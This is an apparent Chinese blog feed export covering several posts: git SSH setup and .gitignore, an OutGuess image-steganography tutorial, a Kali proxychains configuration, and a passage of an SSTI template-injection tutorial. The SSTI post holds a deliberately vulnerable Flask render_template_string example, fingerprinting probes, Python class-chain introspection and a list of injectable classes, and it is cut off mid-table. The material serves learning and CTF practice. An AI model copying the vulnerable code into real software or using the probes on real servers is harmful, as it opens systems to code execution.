ssh免密登录</h2><ol><li>进入用户目录下的.ssh文件夹中输入以下命令，生成一对公私钥</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "xxx@xxx.com"//此邮箱仅作标识</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>进入github的个人页面的SSH and GPG keys页面中，新增一个公钥，将刚生成的公钥的（pub）内容拷贝到其中，在下次pull或者push的时候用ssh的链接就可以操作</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull/push git@github.com:xxx/xxx.git</span><br></pre></td></tr></tbody></table></figure><p>在push文件之前，还是要把修改的文件添加到暂存区以及本地库之后才能push到远程库</p><h1 id="IDEA集成GitHub"><a href="#IDEA集成GitHub" class="headerlink" title="IDEA集成GitHub"></a>IDEA集成GitHub</h1><h2 id="1-配置git忽略文件"><a href="#1-配置git忽略文件" class="headerlink" title="1 配置git忽略文件"></a>1 配置git忽略文件</h2><p>作用：忽略与项目的实际功能无关，不参与服务器上部署运行的文件。把它们忽略掉能够屏蔽IDE工具之<br>间的差异。</p><p>方法：创建忽略规则文件xxxx.ignore（前缀名随便起，建议是git.ignore)，这个文件的存放位置原则上在哪里都可以，为了便于让~/.gitconfig文件引用，建议也放在用户家目录下</p><p>（1）git.ignore文件的模板内容：写入所有不需要文件的后缀</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># Compiled class file</span><br><span class="line">*.classK</span><br><span class="line"></span><br><span class="line">#Log file</span><br><span class="line">*.log</span><br><span class="line"></span><br><span class="line"># BlueJ files</span><br><span class="line">*.ctxt</span><br><span class="line"></span><br><span class="line"># Mobile Tools for Java (J2ME)</span><br><span class="line">.mtj.tmp/</span><br><span class="line"></span><br><span class="line"># Package Files #</span><br><span class="line">*.jar</span><br><span class="line">*.war</span><br><span class="line">*.nar</span><br><span class="line">*.eary</span><br><span class="line">*.zip</span><br><span class="line">*.tar.gz</span><br><span class="line">*.rare</span><br><span class="line"></span><br><span class="line"># virtual machine crash logs, see</span><br><span class="line">http://www.java.com/en/download/help/error_hotspot.xml</span><br><span class="line">hs_err_pid*</span><br><span class="line"></span><br><span class="line">.classpath</span><br><span class="line">.project</span><br><span class="line">.settings</span><br><span class="line">target</span><br><span class="line">.idea</span><br><span class="line">*.iml</span><br></pre></td></tr></tbody></table></figure><p>（2）在.gitconfig文件中引用忽略配置文件（此文件在Windows的家目录中）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[user]</span><br><span class="line">name = xxx</span><br><span class="line">email = xxx@xxx.com</span><br><span class="line">[core]</span><br><span class="line">excludesfile = C:/Users/xxx/git.ignore</span><br><span class="line">注意：这里要使用/，不要使用\</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OutGuess 工具</title>
      <link href="/2025/06/28/outguess-gong-ju/"/>
      <url>/2025/06/28/outguess-gong-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="OutGuess-工具介绍"><a href="#OutGuess-工具介绍" class="headerlink" title="OutGuess 工具介绍"></a>OutGuess 工具介绍</h1><p>OutGuess 是一款用于<strong>隐写术（Steganography）</strong>的开源工具，主要用于在图像文件中隐藏和提取秘密数据。它支持多种图像格式（如 JPEG、PNG），并采用先进的算法确保数据隐藏后不会显著改变图像的外观，从而避免被检测。</p><h2 id="1-OutGuess-的主要功能"><a href="#1-OutGuess-的主要功能" class="headerlink" title="1. OutGuess 的主要功能"></a><strong>1. OutGuess 的主要功能</strong></h2><h3 id="（1）数据隐藏"><a href="#（1）数据隐藏" class="headerlink" title="（1）数据隐藏"></a><strong>（1）数据隐藏</strong></h3><ul><li>将文本、文件或其他数据嵌入到图像中，不影响图像的视觉质量。</li><li>支持<strong>JPEG</strong>格式（最常用），也可用于其他图像格式。</li><li>使用<strong>密钥（密码）</strong>保护隐藏的数据，提高安全性。</li></ul><h3 id="（2）数据提取"><a href="#（2）数据提取" class="headerlink" title="（2）数据提取"></a><strong>（2）数据提取</strong></h3><ul><li>从已隐藏数据的图像中提取原始信息。</li><li>需要正确的密钥才能解密提取的数据。</li></ul><h3 id="（3）抗检测能力"><a href="#（3）抗检测能力" class="headerlink" title="（3）抗检测能力"></a><strong>（3）抗检测能力</strong></h3><ul><li>采用<strong>统计不可见性（Statistical Invisibility）</strong>技术，使隐写后的图像难以被常规检测工具发现。</li><li>适用于<strong>安全通信</strong>和<strong>隐蔽数据传输</strong>。</li></ul><h2 id="2-安装-OutGuess"><a href="#2-安装-OutGuess" class="headerlink" title="2. 安装 OutGuess"></a><strong>2. 安装 OutGuess</strong></h2><h3 id="Linux-macOS"><a href="#Linux-macOS" class="headerlink" title="Linux / macOS"></a><strong>Linux / macOS</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用包管理器安装（如 Debian/Ubuntu）</span><br><span class="line">sudo apt-get install outguess</span><br><span class="line"></span><br><span class="line"># 或从源码编译</span><br><span class="line">git clone https://github.com/resurrecting-open-source-projects/outguess</span><br><span class="line">cd outguess</span><br><span class="line">./configure &amp;&amp; make</span><br><span class="line">sudo make install</span><br></pre></td></tr></tbody></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h3><ul><li>可下载预编译版本或使用 WSL（Windows Subsystem for Linux）运行。</li></ul><h2 id="3-基本使用示例"><a href="#3-基本使用示例" class="headerlink" title="3. 基本使用示例"></a><strong>3. 基本使用示例</strong></h2><h3 id="（1）隐藏数据到图片"><a href="#（1）隐藏数据到图片" class="headerlink" title="（1）隐藏数据到图片"></a><strong>（1）隐藏数据到图片</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k "mysecretkey" -d secret.txt image.jpg output.jpg</span><br></pre></td></tr></tbody></table></figure><ul><li><code>-k "mysecretkey"</code>：设置加密密钥（可选）。</li><li><code>-d secret.txt</code>：要隐藏的文件。</li><li><code>image.jpg</code>：原始图片。</li><li><code>output.jpg</code>：输出含隐藏数据的图片。</li></ul><h3 id="（2）从图片提取数据"><a href="#（2）从图片提取数据" class="headerlink" title="（2）从图片提取数据"></a><strong>（2）从图片提取数据</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k "mysecretkey" -r output.jpg extracted_secret.txt</span><br></pre></td></tr></tbody></table></figure><ul><li><code>-k "mysecretkey"</code>：必须与隐藏时使用的密钥一致。</li><li><code>-r</code>：表示提取模式。</li><li><code>output.jpg</code>：含隐藏数据的图片。</li><li><code>extracted_secret.txt</code>：提取出的数据文件。</li></ul><h3 id="（3）检查图片是否包含隐藏数据"><a href="#（3）检查图片是否包含隐藏数据" class="headerlink" title="（3）检查图片是否包含隐藏数据"></a><strong>（3）检查图片是否包含隐藏数据</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k "mysecretkey" -E output.jpg</span><br></pre></td></tr></tbody></table></figure><ul><li><code>-E</code>：检查图片是否可能包含隐藏数据。</li></ul><h2 id="4-高级用法"><a href="#4-高级用法" class="headerlink" title="4. 高级用法"></a><strong>4. 高级用法</strong></h2><h3 id="（1）调整嵌入强度"><a href="#（1）调整嵌入强度" class="headerlink" title="（1）调整嵌入强度"></a><strong>（1）调整嵌入强度</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k "mysecretkey" -t 0.5 -d secret.txt image.jpg output.jpg</span><br></pre></td></tr></tbody></table></figure><ul><li><code>-t 0.5</code>：调整嵌入强度（0.1~1.0），数值越大隐藏的数据越多，但可能影响图像质量。</li></ul><h3 id="（2）使用不同的嵌入算法"><a href="#（2）使用不同的嵌入算法" class="headerlink" title="（2）使用不同的嵌入算法"></a><strong>（2）使用不同的嵌入算法</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k "mysecretkey" -e F5 -d secret.txt image.jpg output.jpg</span><br></pre></td></tr></tbody></table></figure><ul><li><code>-e F5</code>：使用 F5 算法（更抗检测）。</li></ul><h2 id="5-检测隐写数据"><a href="#5-检测隐写数据" class="headerlink" title="5. 检测隐写数据"></a><strong>5. 检测隐写数据</strong></h2><h3 id="使用-Stegdetect"><a href="#使用-Stegdetect" class="headerlink" title="使用 Stegdetect"></a><strong>使用 Stegdetect</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegdetect output.jpg</span><br></pre></td></tr></tbody></table></figure><ul><li>如果图片可能包含隐藏数据，会返回可疑度评分。</li></ul><h3 id="使用-StegExpose"><a href="#使用-StegExpose" class="headerlink" title="使用 StegExpose"></a><strong>使用 StegExpose</strong></h3><ul><li>更高级的隐写分析工具，可检测 OutGuess 隐藏的数据。</li></ul><hr><h2 id="6-适用场景"><a href="#6-适用场景" class="headerlink" title="6. 适用场景"></a><strong>6. 适用场景</strong></h2><ul><li><strong>隐蔽通信</strong>：在看似正常的图片中传递加密信息。</li><li><strong>数字水印</strong>：隐藏版权信息。</li><li><strong>渗透测试</strong>：测试数据泄露防护能力。</li><li><strong>CTF（Capture The Flag）比赛</strong>：常用于隐写术挑战。</li></ul><hr><h2 id="7-注意事项"><a href="#7-注意事项" class="headerlink" title="7. 注意事项"></a><strong>7. 注意事项</strong></h2><ul><li><strong>密钥安全</strong>：如果密钥泄露，隐藏的数据可能被提取。</li><li><strong>文件大小限制</strong>：JPEG 图像能隐藏的 数据量有限（通常为原图的 10%~15%）。</li><li><strong>抗检测性</strong>：虽然 OutGuess 抗检测能力较强，但高级分析工具仍可能发现异常。</li></ul><hr><h2 id="8-替代工具"><a href="#8-替代工具" class="headerlink" title="8. 替代工具"></a><strong>8. 替代工具</strong></h2><table><thead><tr><th align="left">工具</th><th align="left">特点</th></tr></thead><tbody><tr><td align="left"><strong>Steghide</strong></td><td align="left">支持 JPEG、BMP、WAV 等格式，简单易用</td></tr><tr><td align="left"><strong>OpenStego</strong></td><td align="left">图形界面，支持水印和文件隐藏</td></tr><tr><td align="left"><strong>F5 Steganography</strong></td><td align="left">更先进的 JPEG 隐写算法</td></tr></tbody></table><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>OutGuess 是一款强大的隐写工具，适用于安全研究人员、CTF 选手和隐私保护需求者。通过合理使用密钥和调整嵌入参数，可以有效地隐藏和提取数据，同时避免被检测。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kali虚拟机中配置外网</title>
      <link href="/2025/06/14/kali-xu-ni-ji-zhong-pei-zhi-wai-wang/"/>
      <url>/2025/06/14/kali-xu-ni-ji-zhong-pei-zhi-wai-wang/</url>
      
        <content type="html"><![CDATA[<h1 id="kali虚拟机中配置外网"><a href="#kali虚拟机中配置外网" class="headerlink" title="kali虚拟机中配置外网"></a>kali虚拟机中配置外网</h1><blockquote><p>主机：Windows11</p><p>虚拟机：kali</p></blockquote><p>使kali能访问外网，包括从github上下内容等操作，其他linux操作系统也可进行参考。</p><p>1、在clash的设置中打开局域网连接</p><p>2、将kali的网络适配器设置为桥接模式</p><p>3、使用ipconfig查看主机（win11）的IP地址</p><p>4、使用Kali中内置了ProxyChains开源代理工具，在配置文件<code>/etc/proxychains4.conf</code> 中[ProxyList]下面添加http、主机的IP、clash的代理端口</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">#服务  IP       代理端口</span><br><span class="line">http  192.168.10.10  1234</span><br></pre></td></tr></tbody></table></figure><p>5、然后就可以在kali中快速进行从GitHub上下载内容。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//从GitHub上下载</span><br><span class="line">proxychains git clone https://………………</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="/2025/06/08/ssti-mo-ban-zhu-ru/"/>
      <url>/2025/06/08/ssti-mo-ban-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>SSTI（Server-Side Template Injection），即服务器端模板注入，是一种特定的安全漏洞。其原理和特点主要包括以下几点：</p><p>模板引擎机制：模板引擎的作用是将动态数据与静态模板结合生成最终的输出内容。它们通过替换指定<br>的标签或执行某些代码片段来实现这一过程。</p><p>用户输入处理：当构建这些模板时，如果服务端未对用户输入进行正确的过滤和转义，恶意用户可能会<br>插入一些特殊的代码片段。这些代码片段在模板引擎渲染过程中被执行，可能导致不安全的代码或命令<br>被执行。</p><p>注入的本质：就像SQL注入允许攻击者通过构造特殊的输入来干预数据库查询一样，<strong>SSTI允许攻击者干</strong><br><strong>预模板渲染的过程</strong>。这可以导致敏感信息泄露、远程代码执行等严重后果。</p><h2 id="常见易受攻击的模板引擎"><a href="#常见易受攻击的模板引擎" class="headerlink" title="常见易受攻击的模板引擎"></a>常见易受攻击的模板引擎</h2><ol><li><strong>Python</strong>:<ul><li>Jinja2 (Flask常用)</li><li>Django Templates</li><li>Mako</li><li>Tornado Templates</li></ul></li><li><strong>Java</strong>:<ul><li>FreeMarker</li><li>Velocity</li><li>Thymeleaf</li></ul></li><li><strong>PHP</strong>:<ul><li>Twig (Symfony常用)</li><li>Smarty</li></ul></li><li><strong>JavaScript</strong>:<ul><li>Nunjucks</li><li>EJS</li><li>Pug/Jade</li></ul></li><li><strong>Ruby</strong>:<ul><li>ERB</li><li>Slim</li></ul></li></ol><h2 id="快速判断框架"><a href="#快速判断框架" class="headerlink" title="快速判断框架"></a>快速判断框架</h2><img src="https://pic1.imgdb.cn/item/68452b4d58cb8da5c839e2d3.png" style="zoom: 50%;"><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果${7*7}没有执行（原样输出），那么就是下面的红色线分支</span><br><span class="line"></span><br><span class="line">如果如果${7*7}执行了（输出49），那么接着使用a{*comment*}b。如果正常执行了（输出ab），那么就为Smarty框架，如果没有执行（原样输出），那么继续使用${"z".join("ab")}验证</span><br></pre></td></tr></tbody></table></figure><h2 id="漏洞演示（代码）"><a href="#漏洞演示（代码）" class="headerlink" title="漏洞演示（代码）"></a>漏洞演示（代码）</h2><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, redirect, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span>,methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">'str'</span>)</span><br><span class="line">    html_str = <span class="string">'''</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;{0}&lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    '''</span>.<span class="built_in">format</span>(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></tbody></table></figure><p><code>{0}</code> 是一个占位符，表示实际内容会被动态填充到这里。</p><p> <strong><code>{0}</code> 的作用</strong>：</p><ul><li><strong>占位符</strong>：常见于代码生成或模板化场景（如 C# 的 <code>string.Format()</code>、Python 的 <code>.format()</code> 等）。</li><li><strong>动态替换</strong>：程序运行时会将 <code>{0}</code> 替换为具体的值。</li></ul><h2 id="Payload基础"><a href="#Payload基础" class="headerlink" title="Payload基础"></a>Payload基础</h2><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><blockquote><p>__class__:查找当前类型的所属对象，作用相当于type()，用来获取类的类型</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"a"</span>.__class__</span><br><span class="line">输出：</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>__base__、__bases__:用来获取类的直接父类，前者只能获取一个父类，后者可以获取所有直接父类</p></blockquote><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(test1,test2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">asd = A()</span><br><span class="line"><span class="built_in">print</span>(asd.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(asd.__class__.__bases__)</span><br><span class="line">输出：</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'__main__.test1'</span>&gt;</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">'__main__.test1'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.test2'</span>&gt;)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>__subclasses__:查找父类下的所有子类，后加中括号内可以填写具体哪一个子类的索引</p></blockquote><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(test1,test2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">asd = A()</span><br><span class="line"><span class="built_in">print</span>(test1.__subclasses__())</span><br><span class="line">输出：</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">'__main__.A'</span>&gt;]</span><br></pre></td></tr></tbody></table></figure><blockquote><p>__name__:可以用来查看类的名称</p></blockquote><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(test1,test2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">asd = A()</span><br><span class="line"><span class="built_in">print</span>(asd.__class__.__name__)</span><br><span class="line">输出：</span><br><span class="line">A</span><br></pre></td></tr></tbody></table></figure><blockquote><p>__global__:以字典形式返回函数所在模块命名空间中所有变量</p></blockquote><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hz</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">asd</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(hz.__globals__)</span><br><span class="line">输出：</span><br><span class="line">{<span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x000001580F70D1D1</span>&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>, <span class="string">'__annotations__'</span>: {}, <span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__file__'</span>: <span class="string">'Z:\\Users\\IAX123\\Desktop\\python学习\\1.py'</span>, <span class="string">'__cached__'</span>: <span class="literal">None</span>, <span class="string">'hz'</span>: &lt;function hz at <span class="number">0x000001580F5C04A0</span>&gt;, <span class="string">'test'</span>: &lt;<span class="keyword">class</span> <span class="string">'__main__.test'</span>&gt;}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>__mro__:和base的效果一致，但是这个是显示查找当前类的所有继承类</p></blockquote><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(test1,test2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">asd = A()</span><br><span class="line"><span class="built_in">print</span>(asd.__class__.__mro__)</span><br><span class="line">输出:</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">'__main__.A'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.test1'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.test2'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'object'</span>&gt;)</span><br></pre></td></tr></tbody></table></figure><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span>//A为父类</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>): <span class="keyword">pass</span></span><br><span class="line">c = C()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__)//当前类C</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'__main__.C'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__)//当前类C的父类B</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'__main__.B'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__)//父类的父类</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'__main__.A'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__base__)//层层递进</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'object'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__)//罗列所有父类关系(数组形式)</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">'__main__.C'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.B'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.A'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'object'</span>&gt;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">1</span>].__subclasses__())//看B类下有哪些子类</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">'__main__.C'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'__main__.D'</span>&gt;]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">1</span>])//想要用D类</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'__main__.D'</span>&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="常用注入模块"><a href="#常用注入模块" class="headerlink" title="常用注入模块"></a>常用注入模块</h2><table><thead><tr><th>类/模块名称</th><th>所属模块/包</th></tr></thead><tbody><tr><td>os._AddedDlIDirectory</td><td>os</td></tr><tr><td><strong>os._wrap_close</strong></td><td>os</td></tr><tr><td>_frozen_importlib._DummyModuleLock</td><td>_frozen_importlib</td></tr><tr><td>_frozen_importlib._ModuleLockManager</td><td>_frozen_importlib</td></tr><tr><td>_frozen_importlib.ModuleSpec</td><td>_frozen_importlib</td></tr><tr><td>_frozen_importlib_external.FileLoader</td><td>_frozen_importlib_external</td></tr><tr><td>_frozen_importlib_external._NamespacePath</td><td>_frozen_importlib_external</td></tr><tr><td>_frozen_importlib_external._NamespaceLoader</td><td>_frozen_importlib_external</td></tr><tr><td>_frozen_importlib_external.FileFinder</td><td>_frozen_importlib_external</td></tr><tr><td>zipimport.zipimporter</td><td>zipimport</td></tr><tr><td>zipimport._ZipImportResourceReader</td><td>zipimport</td></tr><tr><td>_sitebuiltins.Quitter</td><td>_sitebuiltins</td></tr><tr><td>_sitebuiltins._Printer</td><td>_sitebuiltins</td></tr><tr><td>warnings.WarningMessage</td><td>warnings</td></tr><tr><td>warnings.catch_warnings</td><td>warnings</td></tr><tr><td>weakref.finalize</td><td>weakref</td></tr><tr><td>pickle._Framer</td><td>pickle</td></tr><tr><td>pickle._Unframer</td><td>pickle</td></tr><tr><td>pickle.Pickler</td><td>pickle</td></tr><tr><td>pickle.Unpickler</td><td>pickle</td></tr><tr><td>jinja2.bccache.Bucket</td><td>jinja2.bccache</td></tr><tr><td>jinja2.runtime.TemplateReference</td><td>jinja2.runtime</td></tr><tr><td>jinja2.runtime.Context</td><td>jinja2.runtime</td></tr><tr><td>ji